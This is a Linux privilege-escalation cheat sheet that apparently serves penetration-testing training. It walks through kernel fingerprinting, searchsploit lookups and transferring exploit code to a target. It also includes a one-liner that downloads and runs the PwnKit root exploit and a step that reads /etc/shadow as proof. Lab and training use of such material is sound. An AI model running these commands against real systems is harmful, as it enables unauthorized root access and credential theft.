
# Kernel Exploits  

Kernel exploits are **last-resort**, lab-only escalation paths when misconfigs (sudo, SUID, cron, etc.) don’t work.

Use them only when:
- snapshot / backup exists  
- target is under your control (lab, VM, internal test)  

---

## 1. Identify Kernel & System

```bash
uname -r          # kernel version
uname -a          # full kernel + arch
cat /etc/issue    # distro
cat /proc/version # extra build info
arch              # x86_64, i686, etc.
````

Capture this in notes. Exact version matters.

---

## 2. Look for Known Vulnerabilities

### Using searchsploit

```bash
searchsploit "<kernel version>"
searchsploit "Ubuntu 16.04 kernel"
searchsploit "CentOS 7 local root"
```

Optionally mirror exploit locally:

```bash
searchsploit -m <exploit-id>
```

Examples:

```bash
searchsploit "linux kernel 3.13"
searchsploit "dirty cow"
```

---

## 3. If You Cannot Download on the Target

(Restricted outbound traffic / no curl / no wget / no direct internet)

### Option 1 — scp via SSH

On **your** machine:

```bash
base64 exploit.c > exploit.b64
scp exploit.b64 user@<TARGET_IP>:/tmp/
```

On **target**:

```bash
cd /tmp
base64 -d exploit.b64 > exploit.c
```

---

### Option 2 — Python HTTP Server (if target can reach you)

On **your** machine:

```bash
python3 -m http.server 8080
```

On **target** (if curl or wget exists):

```bash
curl http://<YOUR_IP>:8080/exploit.c -o exploit.c
# or
wget http://<YOUR_IP>:8080/exploit.c -O exploit.c
```

---

### Option 3 — Manual heredoc (copy/paste)

On **target**:

```bash
cat << 'EOF' > exploit.c
<PASTE FULL SOURCE CODE HERE>
EOF
```

---

### Option 4 — scp raw C file (if base64 not needed)

On **your** machine:

```bash
scp exploit.c user@<TARGET_IP>:/tmp/exploit.c
```

---

## 4. PwnKit (polkit) Example (Classic Local Root)

If polkit is vulnerable and present:

```bash
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit
./PwnKit
```

If curl is blocked, use one of the transfer methods above to move `PwnKit` or its source to the target.

---

## 5. Compile Exploit (GCC)

```bash
gcc exploit.c -o exploit
file exploit          # confirm arch (ELF 64-bit / 32-bit)
```

Run:

```bash
./exploit
id
```

Collect:

* `whoami`
* `id`
* proof of root (`cat /etc/shadow`, etc., in lab only)

---

## 6. Quick Operator Checklist

* [ ] Exact kernel version captured (`uname -r`, distro)
* [ ] Exploit matches version + distro + arch
* [ ] Exploit safely transferred to target (no guessing, no truncation)
* [ ] Binary compiled successfully (`file exploit` matches target arch)
* [ ] Exploit executed, output captured (`id`)
* [ ] Snapshot/restore available if kernel panic occurs

---

**Only use kernel exploits when misconfigs fail and the environment is safe to break.**
